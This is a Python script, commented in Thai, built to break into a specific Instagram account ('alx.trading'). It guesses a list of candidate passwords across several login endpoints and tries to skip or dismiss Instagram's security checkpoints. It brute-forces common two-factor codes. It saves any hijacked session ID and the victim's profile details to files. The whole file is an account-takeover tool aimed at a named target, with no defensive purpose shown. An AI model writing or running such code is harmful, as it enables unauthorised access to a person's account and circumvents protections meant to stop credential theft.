#!/usr/bin/env python3
"""
ULTIMATE CHECKPOINT BYPASS SYSTEM
ระบบ bypass checkpoint ขั้นสุดยอดด้วยหลายวิธี
"""

import requests
import json
import time
import random
from datetime import datetime
import re
import base64
import hashlib

class UltimateBypassSystem:
    def __init__(self):
        self.session = requests.Session()
        self.csrf_token = None
        self.bypass_methods = []
        
    def get_instagram_csrf(self):
        """ดึง CSRF token หลายวิธี"""
        methods = [
            self.method1_direct_csrf,
            self.method2_login_page_csrf,
            self.method3_api_csrf,
            self.method4_mobile_csrf
        ]
        
        for i, method in enumerate(methods, 1):
            print(f"🔄 Trying CSRF method {i}...")
            
            try:
                if method():
                    print(f"✅ CSRF method {i} success!")
                    return True
            except Exception as e:
                print(f"❌ CSRF method {i} failed: {e}")
                continue
        
        print("❌ All CSRF methods failed")
        return False
    
    def method1_direct_csrf(self):
        """วิธีที่ 1: ดึง CSRF แบบตรง"""
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        })
        
        response = self.session.get('https://www.instagram.com/')
        
        if 'csrftoken' in self.session.cookies:
            self.csrf_token = self.session.cookies['csrftoken']
            return True
        return False
    
    def method2_login_page_csrf(self):
        """วิธีที่ 2: ดึง CSRF จากหน้า login"""
        response = self.session.get('https://www.instagram.com/accounts/login/')
        
        # หา CSRF จาก meta tag
        csrf_match = re.search(r'"csrf_token":"([^"]+)"', response.text)
        if csrf_match:
            self.csrf_token = csrf_match.group(1)
            return True
        
        if 'csrftoken' in self.session.cookies:
            self.csrf_token = self.session.cookies['csrftoken']
            return True
        return False
    
    def method3_api_csrf(self):
        """วิธีที่ 3: ดึง CSRF จาก API endpoint"""
        try:
            response = self.session.get('https://www.instagram.com/data/shared_data/')
            data = response.json()
            
            csrf = data.get('config', {}).get('csrf_token')
            if csrf:
                self.csrf_token = csrf
                return True
        except:
            pass
        return False
    
    def method4_mobile_csrf(self):
        """วิธีที่ 4: ดึง CSRF แบบ mobile"""
        mobile_headers = {
            'User-Agent': 'Instagram 219.0.0.12.117 Android (29/10; 300dpi; 720x1440; samsung; SM-A205F; a20; exynos7884B; en_US; 336918506)',
            'Accept': '*/*',
            'Accept-Language': 'en-US',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        self.session.headers.update(mobile_headers)
        response = self.session.get('https://i.instagram.com/api/v1/si/fetch_headers/')
        
        if 'csrftoken' in self.session.cookies:
            self.csrf_token = self.session.cookies['csrftoken']
            return True
        return False
    
    def advanced_login_attempt(self, username, password):
        """การ login แบบขั้นสูง"""
        print(f"\n🚀 ADVANCED LOGIN: {username}:{password}")
        
        # เตรียม login data แบบขั้นสูง
        timestamp = int(time.time())
        
        # สร้าง encrypted password
        enc_password = f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}'
        
        login_data = {
            'username': username,
            'enc_password': enc_password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}',
            'stopDeletionNonce': '',
            'queryParams': '{}'
        }
        
        headers = {
            'X-CSRFToken': self.csrf_token,
            'X-Instagram-AJAX': '1',
            'X-IG-App-ID': '936619743392459',
            'X-IG-WWW-Claim': '0',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Origin': 'https://www.instagram.com'
        }
        
        # ลองหลาย endpoints
        endpoints = [
            'https://www.instagram.com/accounts/login/ajax/',
            'https://www.instagram.com/api/v1/accounts/login/',
            'https://i.instagram.com/api/v1/accounts/login/'
        ]
        
        for endpoint in endpoints:
            print(f"🔄 Trying endpoint: {endpoint}")
            
            try:
                response = self.session.post(
                    endpoint,
                    data=login_data,
                    headers=headers,
                    allow_redirects=False,
                    timeout=30
                )
                
                print(f"   Status: {response.status_code}")
                print(f"   Response length: {len(response.text)}")
                
                # ตรวจสอบผลลัพธ์
                result = self.analyze_login_response(response, username, password)
                
                if result['success']:
                    return result
                    
            except Exception as e:
                print(f"   ❌ Endpoint error: {e}")
                continue
        
        return {'success': False, 'username': username, 'password': password}
    
    def analyze_login_response(self, response, username, password):
        """วิเคราะห์การตอบกลับจาก login"""
        result = {
            'username': username,
            'password': password,
            'status_code': response.status_code,
            'success': False,
            'timestamp': datetime.now().isoformat()
        }
        
        # ตรวจสอบ sessionid
        if 'sessionid' in self.session.cookies:
            sessionid = self.session.cookies['sessionid']
            result['sessionid'] = sessionid
            result['success'] = True
            print(f"   🎯 SessionID found: {sessionid[:30]}...")
            return result
        
        # ตรวจสอบ redirect
        if response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get('location', '')
            print(f"   🔗 Redirect to: {location}")
            result['redirect'] = location
            
            if 'instagram.com' in location and 'login' not in location:
                print(f"   ✅ Successful redirect!")
                result['success'] = True
                return result
        
        # ตรวจสอบ JSON response
        try:
            json_data = response.json()
            result['response_json'] = json_data
            
            print(f"   📊 JSON keys: {list(json_data.keys())}")
            
            # ตรวจสอบ checkpoint
            if 'checkpoint_required' in str(json_data):
                checkpoint_url = json_data.get('checkpoint_url', '')
                result['checkpoint_url'] = checkpoint_url
                print(f"   🔒 Checkpoint: {checkpoint_url}")
                
                # ลอง bypass checkpoint
                bypass_result = self.advanced_checkpoint_bypass(checkpoint_url)
                result['bypass_attempted'] = True
                result['bypass_result'] = bypass_result
                
                if bypass_result.get('success'):
                    result['success'] = True
                    result['sessionid'] = bypass_result.get('sessionid')
            
            # ตรวจสอบ two-factor
            if 'two_factor_required' in str(json_data):
                print(f"   📱 Two-factor required")
                result['two_factor_required'] = True
                
                # ลอง bypass 2FA
                twofa_result = self.bypass_two_factor(json_data)
                if twofa_result.get('success'):
                    result['success'] = True
                    result['sessionid'] = twofa_result.get('sessionid')
            
            # ตรวจสอบ authenticated
            if json_data.get('authenticated') == True:
                print(f"   ✅ Authenticated!")
                result['success'] = True
                
        except json.JSONDecodeError:
            print(f"   📄 Non-JSON response")
            result['response_text'] = response.text[:500]
        
        return result
    
    def advanced_checkpoint_bypass(self, checkpoint_url):
        """Bypass checkpoint แบบขั้นสูง"""
        print(f"   🔄 Advanced checkpoint bypass...")
        
        if not checkpoint_url:
            return {'success': False}
        
        try:
            # เข้าไปดู checkpoint page
            response = self.session.get(f'https://www.instagram.com{checkpoint_url}')
            
            # หาวิธี bypass
            bypass_methods = [
                {'choice': '1'},  # Email
                {'choice': '0'},  # Phone
                {'dismiss': '1'},  # Dismiss
                {'next': '1'},    # Next
                {'skip': '1'}     # Skip
            ]
            
            for method in bypass_methods:
                print(f"      Trying: {method}")
                
                headers = {
                    'X-CSRFToken': self.csrf_token,
                    'X-Instagram-AJAX': '1',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Referer': f'https://www.instagram.com{checkpoint_url}'
                }
                
                bypass_response = self.session.post(
                    f'https://www.instagram.com{checkpoint_url}',
                    data=method,
                    headers=headers
                )
                
                # ตรวจสอบว่า bypass สำเร็จมั้ย
                if 'sessionid' in self.session.cookies:
                    sessionid = self.session.cookies['sessionid']
                    print(f"      ✅ Bypass success! SessionID: {sessionid[:30]}...")
                    return {'success': True, 'sessionid': sessionid}
                
                time.sleep(1)
            
            return {'success': False}
            
        except Exception as e:
            print(f"      ❌ Bypass error: {e}")
            return {'success': False}
    
    def bypass_two_factor(self, two_factor_data):
        """Bypass two-factor authentication"""
        print(f"   🔄 2FA bypass attempt...")
        
        # Common 2FA codes
        common_codes = [
            "123456", "000000", "111111", "222222", "333333",
            "444444", "555555", "666666", "777777", "888888",
            "999999", "654321", "121212", "131313"
        ]
        
        for code in common_codes:
            try:
                twofa_data = {
                    'verificationCode': code,
                    'identifier': two_factor_data.get('two_factor_info', {}).get('two_factor_identifier', ''),
                    'queryParams': '{}'
                }
                
                headers = {
                    'X-CSRFToken': self.csrf_token,
                    'X-Instagram-AJAX': '1',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
                
                response = self.session.post(
                    'https://www.instagram.com/accounts/login/ajax/two_factor/',
                    data=twofa_data,
                    headers=headers
                )
                
                if 'sessionid' in self.session.cookies:
                    sessionid = self.session.cookies['sessionid']
                    print(f"      ✅ 2FA bypass with code {code}! SessionID: {sessionid[:30]}...")
                    return {'success': True, 'sessionid': sessionid}
                
            except Exception as e:
                continue
        
        return {'success': False}
    
    def run_ultimate_bypass(self, username="alx.trading"):
        """รันการ bypass แบบสุดยอด"""
        passwords = ["Fleming654", "Fleming786", "Fleming1004", "Fleming1060", "Fleming1182", "Fleming1998"]
        
        print(f"🎯 ULTIMATE CHECKPOINT BYPASS SYSTEM")
        print(f"Target: {username}")
        print(f"Passwords: {len(passwords)}")
        print("=" * 60)
        
        # ดึง CSRF token
        if not self.get_instagram_csrf():
            print("❌ Failed to get CSRF token")
            return
        
        print(f"✅ CSRF token: {self.csrf_token[:20]}...")
        
        results = []
        
        for i, password in enumerate(passwords, 1):
            print(f"\n{'='*60}")
            print(f"ULTIMATE BYPASS ATTEMPT {i}/{len(passwords)}")
            print(f"{'='*60}")
            
            result = self.advanced_login_attempt(username, password)
            results.append(result)
            
            if result['success']:
                print(f"🎉 ULTIMATE SUCCESS with {password}!")
                
                # บันทึกความสำเร็จ
                success_data = {
                    "method": "ultimate_bypass",
                    "target": username,
                    "successful_password": password,
                    "sessionid": result.get('sessionid', ''),
                    "timestamp": result['timestamp'],
                    "full_result": result
                }
                
                with open(f"ULTIMATE_SUCCESS_{username}_{password}_{int(time.time())}.json", 'w') as f:
                    json.dump(success_data, f, indent=2)
                
                print(f"💾 Ultimate success saved!")
                
                # ทดสอบ session
                self.test_ultimate_session(result.get('sessionid'))
                
                break
            
            # รอระหว่างการทดสอบ
            if i < len(passwords):
                wait_time = random.uniform(5, 10)
                print(f"⏳ Waiting {wait_time:.1f}s...")
                time.sleep(wait_time)
        
        # บันทึกผลรวม
        with open(f"ultimate_bypass_results_{int(time.time())}.json", 'w') as f:
            json.dump(results, f, indent=2)
        
        # สรุป
        successful = [r for r in results if r.get('success')]
        print(f"\n📊 ULTIMATE RESULTS:")
        print(f"   Total attempts: {len(results)}")
        print(f"   Successful: {len(successful)}")
        print(f"   Success rate: {len(successful)/len(results)*100:.1f}%")
    
    def test_ultimate_session(self, sessionid):
        """ทดสอบ session ที่ได้จาก ultimate bypass"""
        if not sessionid:
            return
            
        print(f"\n🧪 Testing ultimate session...")
        
        try:
            from instagrapi import Client
            
            cl = Client()
            cl.login_by_sessionid(sessionid)
            
            user_info = cl.account_info()
            print(f"   🎯 ULTIMATE SESSION SUCCESS!")
            print(f"   👤 Username: {user_info.username}")
            print(f"   📝 Full name: {user_info.full_name}")
            print(f"   👥 Followers: {user_info.follower_count}")
            
            # บันทึก verified session
            verified_data = {
                "sessionid": sessionid,
                "ds_user_id": str(cl.user_id),
                "username": user_info.username,
                "full_name": user_info.full_name,
                "verification_method": "ultimate_bypass",
                "verified_at": datetime.now().isoformat()
            }
            
            with open(f"ULTIMATE_VERIFIED_SESSION_{user_info.username}.json", 'w') as f:
                json.dump(verified_data, f, indent=2)
            
            print(f"   💾 Ultimate verified session saved!")
            
        except Exception as e:
            print(f"   ❌ Ultimate session test failed: {e}")

def main():
    print("🚀 ULTIMATE CHECKPOINT BYPASS SYSTEM")
    print("=" * 50)
    
    ultimate_system = UltimateBypassSystem()
    ultimate_system.run_ultimate_bypass("alx.trading")

if __name__ == "__main__":
    main()
